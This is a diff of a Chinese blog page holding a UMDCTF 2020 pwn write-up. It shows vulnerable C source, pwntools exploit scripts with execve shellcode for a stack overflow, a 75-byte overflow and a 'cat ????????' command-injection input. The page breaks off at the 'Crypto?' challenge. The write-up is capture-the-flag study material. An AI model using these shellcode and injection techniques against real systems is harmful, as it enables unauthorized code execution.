@@ -1,41 +1,82 @@
 <!DOCTYPE html>
+
 <html lang="zh-Hans">
+
 <head><meta name="generator" content="Hexo 3.9.0">
 
+
+
     <!--[if lt IE 9]>
+
         <style>body {display: none; background: none !important} </style>
+
         <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+
     <![endif]-->
 
+
+
 <meta charset="utf-8">
+
 <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
 <meta name="format-detection" content="telephone=no">
+
 <meta name="author" content="binLep">
 
 
 
+
+
+
+
 <meta name="description" content="周末将近十场比赛，WriteUp 都写不完，更别说复现题目了……">
+
 <meta name="keywords" content="CTF, Pwn, Sec">
+
 <meta property="og:type" content="article">
+
 <meta property="og:title" content="【WriteUp】UMDCTF  2020 -- Pwn 题解">
+
 <meta property="og:url" content="https://binlep.github.io/old_blog_01/2020/04/21/【WriteUp】UMDCTF  2020 -- Pwn 题解/index.html">
+
 <meta property="og:site_name" content="binLep&#39;s Blog">
+
 <meta property="og:description" content="周末将近十场比赛，WriteUp 都写不完，更别说复现题目了……">
+
 <meta property="og:locale" content="zh-Hans">
+
 <meta property="og:updated_time" content="2020-04-22T16:06:20.470Z">
+
 <meta name="twitter:card" content="summary">
+
 <meta name="twitter:title" content="【WriteUp】UMDCTF  2020 -- Pwn 题解">
+
 <meta name="twitter:description" content="周末将近十场比赛，WriteUp 都写不完，更别说复现题目了……">
 
-<link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
 
-    <link rel="alternate" href="/atom.xml" title="binLep&#39;s Blog" type="application/atom+xml">
+<link rel="apple-touch-icon" href="/old_blog_01/apple-touch-icon.png">
 
 
 
-    <link rel="shortcut icon" href="/favicon.png">
+
+
+    <link rel="alternate" href="/old_blog_01/atom.xml" title="binLep&#39;s Blog" type="application/atom+xml">
+
+
+
+
+
+
+
+    <link rel="shortcut icon" href="/old_blog_01/favicon.png">
+
+
+
+
 
 
 
@@ -43,45 +84,91 @@
 
 
 
+
+
+
+
     <link href="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
 
 
 
+
+
+
+
     <script src="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/pace.min.js"></script>
+
     <link href="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
 
 
 <link rel="stylesheet" href="../../../../css/style.css">
 
 
 
+
+
+
+
 <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+
 
 
 <title>【WriteUp】UMDCTF  2020 -- Pwn 题解 | binLep&#39;s Blog</title>
 
+
+
 <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+
 <script src="//cdnjs.cloudflare.com/ajax/libs/clipboard.js/1.5.10/clipboard.min.js"></script>
 
+
+
 <script>
+
     var yiliaConfig = {
+
         fancybox: true,
+
         animate: true,
+
         isHome: false,
+
         isPost: true,
+
         isArchive: false,
+
         isTag: false,
+
         isCategory: false,
+
         fancybox_js: "//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.js",
+
         scrollreveal: "//cdnjs.cloudflare.com/ajax/libs/scrollReveal.js/3.1.4/scrollreveal.min.js",
+
         search: true
+
     }
+
 </script>
 
 
+
+
+
     <script>
+
         yiliaConfig.jquery_ui = [true, "//cdnjs.cloudflare.com/ajax/libs/jqueryui/1.10.4/jquery-ui.min.js", "//cdnjs.cloudflare.com/ajax/libs/jqueryui/1.10.4/css/jquery-ui.min.css"];
+
     </script>
+
+
+
+
 
 
 
@@ -92,431 +179,863 @@
 
 
 
+
+
+
+
+
+
+
 </head></html>
+
 <body>
+
   <div id="container">
+
     <div class="left-col">
+
     <div class="overlay"></div>
+
 <div class="intrude-less">
+
     <header id="header" class="inner">
-        <a href="/" class="profilepic">
-            <img src="/img/avatar.png" class="animated zoomIn">
+
+        <a href="/old_blog_01/" class="profilepic">
+
+            <img src="/old_blog_01/img/avatar.png" class="animated zoomIn">
+
         </a>
+
         <hgroup>
-          <h1 class="header-author"><a href="/">binLep</a></h1>
+
+          <h1 class="header-author"><a href="/old_blog_01/">binLep</a></h1>
+
         </hgroup>
 
+
+
         
+
         <p class="header-subtitle">图片托管在github，国内访问会很慢QWQ</p>
-        
 
         
+
+
+
+        
+
             <form id="search-form">
+
             <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
+
             <i class="fa fa-times" onclick="resetSearch()"></i>
+
             </form>
+
             <div id="local-search-result"></div>
+
             <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+
         
 
 
+
+
+
         
+
             <div id="switch-btn" class="switch-btn">
+
                 <div class="icon">
+
                     <div class="icon-ctn">
+
                         <div class="icon-wrap icon-house" data-idx="0">
+
                             <div class="birdhouse"></div>
+
                             <div class="birdhouse_holes"></div>
+
                         </div>
+
                         <div class="icon-wrap icon-ribbon hide" data-idx="1">
+
                             <div class="ribbon"></div>
+
                         </div>
+
                         
+
                         
+
                         <div class="icon-wrap icon-me hide" data-idx="3">
+
                             <div class="user"></div>
+
                             <div class="shoulder"></div>
+
                         </div>
+
                         
+
                     </div>
+
                     
+
                 </div>
+
                 <div class="tips-box hide">
+
                     <div class="tips-arrow"></div>
+
                     <ul class="tips-inner">
+
                         <li>菜单</li>
+
                         <li>标签</li>
+
                         
+
                         
+
                         <li>关于我</li>
+
                         
+
                     </ul>
+
                 </div>
+
             </div>
+
         
+
+
 
         <div id="switch-area" class="switch-area">
+
             <div class="switch-wrap">
+
                 <section class="switch-part switch-part1">
+
                     <nav class="header-menu">
+
                         <ul>
+
                         
+
                             <li><a href="../../../../index.html">主页</a></li>
+
                         
+
                             <li><a href="../../../../archives/">所有文章</a></li>
+
                         
+
                             <li><a href="../../../../tags/">标签云</a></li>
+
                         
+
                             <li><a href="../../../../about/">关于我</a></li>
+
                         
+
                             <li><a href="../../../../friends/">友情链接</a></li>
+
                         
+
                         </ul>
+
                     </nav>
+
                     <nav class="header-nav">
+
                         <ul class="social">
+
                             
+
                                 <a class="fa Email" href="mailto:1723569975@qq.com" title="Email"></a>
+
                             
+
                                 <a class="fa RSS" href="../../../../atom.xml" title="RSS"></a>
+
                             
+
                         </ul>
+
                     </nav>
+
                 </section>
-                
-                
-                <section class="switch-part switch-part2">
-                    <div class="widget tagcloud" id="js-tagcloud">
-                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/BugkuCTF/">BugkuCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/CryptixCTF/">CryptixCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Event/">Event</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Hackme-CTF/">Hackme CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Jarvis-OJ/">Jarvis OJ</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Linux-Pwn/">Linux Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/MOCTF/">MOCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Newark-Academy-CTF/">Newark Academy CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Platform/">Platform</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Platfrom/">Platfrom</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/RSCTF/">RSCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Windows-Pwn/">Windows Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/XMan/">XMan</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/mipsel/">mipsel</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/ret2libc/">ret2libc</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/ret2shellcode/">ret2shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/xml注入/">xml注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/使用教程/">使用教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/安装教程/">安装教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/搭建Hexo/">搭建Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/攻防世界/">攻防世界</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/模板/">模板</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/玄武杯/">玄武杯</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/环境搭建/">环境搭建</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/问题汇总/">问题汇总</a></li></ul>
-                    </div>
-                </section>
-                
-                
+
                 
 
                 
-                
-                <section class="switch-part switch-part3">
-                
-                    <div id="js-aboutme">Pwn路上的小萌新~</div>
+
+                <section class="switch-part switch-part2">
+
+                    <div class="widget tagcloud" id="js-tagcloud">
+
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/BugkuCTF/">BugkuCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/CryptixCTF/">CryptixCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Event/">Event</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Hackme-CTF/">Hackme CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Jarvis-OJ/">Jarvis OJ</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Linux-Pwn/">Linux Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/MOCTF/">MOCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Newark-Academy-CTF/">Newark Academy CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Platform/">Platform</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Platfrom/">Platfrom</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/RSCTF/">RSCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Windows-Pwn/">Windows Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/XMan/">XMan</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/mipsel/">mipsel</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/ret2libc/">ret2libc</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/ret2shellcode/">ret2shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/xml注入/">xml注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/使用教程/">使用教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/安装教程/">安装教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/搭建Hexo/">搭建Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/攻防世界/">攻防世界</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/模板/">模板</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/玄武杯/">玄武杯</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/环境搭建/">环境搭建</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/问题汇总/">问题汇总</a></li></ul>
+
+                    </div>
+
                 </section>
+
                 
+
+                
+
+                
+
+
+
+                
+
+                
+
+                <section class="switch-part switch-part3">
+
+                
+
+                    <div id="js-aboutme">Pwn路上的小萌新~</div>
+
+                </section>
+
+                
+
             </div>
+
         </div>
+
     </header>                
+
 </div>
+
     </div>
+
     <div class="mid-col">
+
       <nav id="mobile-nav">
+
       <div class="overlay">
+
           <div class="slider-trigger"></div>
-          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">binLep</a></h1>
+
+          <h1 class="header-author js-mobile-header hide"><a href="/old_blog_01/" title="回到主页">binLep</a></h1>
+
       </div>
+
     <div class="intrude-less">
+
         <header id="header" class="inner">
-            <a href="/" class="profilepic">
-                <img src="/img/avatar.png" class="animated zoomIn">
+
+            <a href="/old_blog_01/" class="profilepic">
+
+                <img src="/old_blog_01/img/avatar.png" class="animated zoomIn">
+
             </a>
+
             <hgroup>
-              <h1 class="header-author"><a href="/" title="回到主页">binLep</a></h1>
+
+              <h1 class="header-author"><a href="/old_blog_01/" title="回到主页">binLep</a></h1>
+
             </hgroup>
+
             
+
             <p class="header-subtitle">图片托管在github，国内访问会很慢QWQ</p>
+
             
+
             <nav class="header-menu">
+
                 <ul>
+
                 
+
                     <li><a href="../../../../index.html">主页</a></li>
+
                 
+
                     <li><a href="../../../../archives/">所有文章</a></li>
+
                 
+
                     <li><a href="../../../../tags/">标签云</a></li>
+
                 
+
                     <li><a href="../../../../about/">关于我</a></li>
+
                 
+
                     <li><a href="../../../../friends/">友情链接</a></li>
+
                 
+
                 <div class="clearfix"></div>
+
                 </ul>
+
             </nav>
+
             <nav class="header-nav">
+
                         <ul class="social">
+
                             
+
                                 <a class="fa Email" target="_blank" href="mailto:1723569975@qq.com" title="Email"></a>
+
                             
+
                                 <a class="fa RSS" target="_blank" href="../../../../atom.xml" title="RSS"></a>
+
                             
+
                         </ul>
+
             </nav>
+
         </header>                
+
     </div>
+
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+
 </nav>
+
       <div class="body-wrap"><article id="post-【WriteUp】UMDCTF  2020 -- Pwn 题解" class="article article-type-post" itemscope itemprop="blogPost">
+
   
+
     <div class="article-meta">
+
       <a href="" class="article-date">
+
       <time datetime="2020-04-20T23:23:00.000Z" itemprop="datePublished">2020-04-20</time>
+
 </a>
 
 
+
+
+
     </div>
+
   
+
   <div class="article-inner">
+
     
+
       <input type="hidden" class="isFancy" />
+
     
+
     
+
       <header class="article-header">
+
         
+
   
+
     <h1 class="article-title" itemprop="name">
+
       【WriteUp】UMDCTF  2020 -- Pwn 题解
+
     </h1>
+
   
+
+
 
       </header>
+
       
+
       <div class="article-info article-info-post">
+
         
+
     <div class="article-category tagcloud">
+
     <a class="article-category-link" href="../../../../categories/WriteUp/">WriteUp</a><a class="article-category-link" href="../../../../categories/WriteUp/UMDCTF/">UMDCTF</a>
+
     </div>
 
 
+
+
+
         
+
         <div class="clearfix"></div>
+
       </div>
+
       
+
     
+
     <div class="article-entry" itemprop="articleBody">
+
       
+
           
+
         <p>周末将近十场比赛，WriteUp 都写不完，更别说复现题目了……</p>
+
 <a id="more"></a>
 
+
+
 <h2 id="Easy-Right"><a href="#Easy-Right" class="headerlink" title="Easy Right?"></a>Easy Right?</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+
 <p>The mitigations have left the room..<br><br>nc 142.93.113.134 9999<br><br>Author: moogboi</p>
+
 </blockquote>
+
 <hr>
+
 <h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution:"></a>Solution:</h3><p>程序保护如下：</p>
+
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
 
+
+
 <p><strong>main 函数如下：</strong></p>
+
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Is this an... executable stack? %llx\n"</span>, &amp;s);</span><br><span class="line">  fgets(&amp;s, <span class="number">4919</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+
+
 <p>shellcode 完事</p>
+
 <p><strong>exp 如下：</strong></p>
+
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">2</span></span><br><span class="line">context(arch=<span class="string">"amd64"</span>, endian=<span class="string">'el'</span>, os=<span class="string">"linux"</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./baby'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'142.93.113.134'</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'stack? '</span>)</span><br><span class="line">addr_stack = int(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">pd = <span class="string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0"</span>\</span><br><span class="line">     <span class="string">"\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f"</span>\</span><br><span class="line">     <span class="string">"\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span></span><br><span class="line">pd = pd.ljust(<span class="number">0x88</span>, <span class="string">'a'</span>)</span><br><span class="line">pd += p64(addr_stack)</span><br><span class="line">p.sendlineafter(<span class="string">'\n'</span>, pd)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
+
+
 <hr>
+
 <h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UMDCTF-&#123;shell_m3_maybe&#125;</span><br></pre></td></tr></table></figure>
 
+
+
 <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><h3 id="Description-1"><a href="#Description-1" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+
 <p>To read or not to read the flag… That is the question!<br><br>nc 192.241.138.174 9999<br><br>Author: lumpus</p>
+
 </blockquote>
+
 <hr>
+
 <h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution:"></a>Solution:</h3><p>命令注入题，获得 flag 方式如下：</p>
+
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@lepPwn:~/clash<span class="comment"># nc 192.241.138.174 9999</span></span><br><span class="line">The flag.txt is here. Try to <span class="built_in">read</span> it!</span><br><span class="line">&gt; cat ????????</span><br><span class="line">UMDCTF-&#123;s0me_questions_h4ve_answ3rs&#125;</span><br></pre></td></tr></table></figure>
 
+
+
 <hr>
+
 <h3 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UMDCTF-&#123;s0me_questions_h4ve_answ3rs&#125;</span><br></pre></td></tr></table></figure>
 
+
+
 <h2 id="Cowspeak-as-a-Service-CaaS"><a href="#Cowspeak-as-a-Service-CaaS" class="headerlink" title="Cowspeak as a Service (CaaS)"></a>Cowspeak as a Service (CaaS)</h2><h3 id="Description-2"><a href="#Description-2" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+
 <p>lumpus gave up installing cowspeak so he made it a remote service instead! Too bad it keeps overwriting old messages… Can you become chief cow and read the first message?<br><br>nc 192.241.138.174 9998<br><br>Author: WittsEnd2, lumpus</p>
+
 </blockquote>
+
 <hr>
+
 <h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution:"></a>Solution:</h3><p><strong>源码如下：</strong></p>
+
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">moo</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> speak[<span class="number">64</span>];</span><br><span class="line">        <span class="keyword">int</span> chief_cow = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">strcpy</span>(speak, msg);</span><br><span class="line">        speak[<span class="built_in">strcspn</span>(speak, <span class="string">"\r\n"</span>)] = <span class="number">0</span>;</span><br><span class="line">        setenv(<span class="string">"MSG"</span>, speak, chief_cow);</span><br><span class="line"></span><br><span class="line">        system(<span class="string">"./cowsay $MSG"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">        setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Welcome to Cowsay as a Service (CaaS)!\n"</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Enter your message: \n"</span>);</span><br><span class="line"></span><br><span class="line">        fgets(buf, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">        moo(buf);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+
+
 <p>题目没给文件，也没给 system 里面用到的 cowsay 文件，拿到手完全不知道怎么做</p>
+
 <p>之后误打误撞做出来了，字符串长一点就能出来</p>
+
 <p><strong>exp 如下：</strong></p>
+
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'192.241.138.174'</span>, <span class="number">9998</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span> * <span class="number">75</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
+
+
 <hr>
+
 <h3 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UMDCTF-&#123;P5Th_Ov3rF10w&#125;</span><br></pre></td></tr></table></figure>
 
+
+
 <h2 id="shellcodia1"><a href="#shellcodia1" class="headerlink" title="shellcodia1"></a>shellcodia1</h2><h3 id="Description-3"><a href="#Description-3" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+
 <p>Welcome to shellcodia, here is an opportunity to write some custom shellcode to retrieve the flag!<br><br>Simply connect, submit your shellcode in binary form, and if you’ve completed the challenge then a flag will return. This first challenge is to return the value 7. Now, a few things to remember, these are x64 machines so don’t think you can sneak by with 32bit shellcode. Additionally, the environment assumes nothing about the shellcode you give it. It’s highly unlikely that if you break the environment, even if you accomplished the goal, you will get the flag.<br><br>Submit your shellcode to: 157.245.88.100:7778<br><br>Good luck!<br><br>Author: quantumite (BlueStar)<br><br>(Note: flag is in UMDCTF{} format)</p>
+
 </blockquote>
+
 <hr>
+
 <h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution:"></a>Solution:</h3><p>shellcode 入门题</p>
+
 <p><strong>exp 如下：</strong></p>
+
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">2</span></span><br><span class="line">context(arch=<span class="string">"amd64"</span>, endian=<span class="string">'el'</span>, os=<span class="string">"linux"</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">pd = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">mov rax, 7</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./shellcode_environ'</span>)</span><br><span class="line">    gdb.attach(p, <span class="string">"b *0x4005ec\nc"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'qwwww\n'</span>, <span class="string">'binLep'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'emmmm'</span>, pd)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'157.245.88.100'</span>, <span class="number">7778</span>)</span><br><span class="line">    p.sendline(pd)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
+
+
 <hr>
+
 <h3 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UMDCTF&#123;R_U_@_Tim3_tR@v3ll3r_OR_Ju<span class="variable">$t_R3a11y_Sm</span>@rT&#125;</span><br></pre></td></tr></table></figure>
 
+
+
 <h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto?"></a>Crypto?</h2><h3 id="Description-4"><a href="#Description-4" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+
 <p>Hey do you mind debugging my program for me? I didn’t have much time to look it over myself. If you do a good job, I’ll give you a flag.<br><br><a href="https://drive.google.com/drive/folders/1AJtxP_pg4_HXSgpJTy0DIJYiGXsPG7X8?usp=sharing" target="_blank" rel="noopener">Download link</a><br><br>nc 192.241.138.174 9997<br><br>You’ll be dropped into a shell. Just run ./questionable to do what you need.<br><br>Author: johnokeefe</p>
+
 </blockquote>
+
 <hr>
+
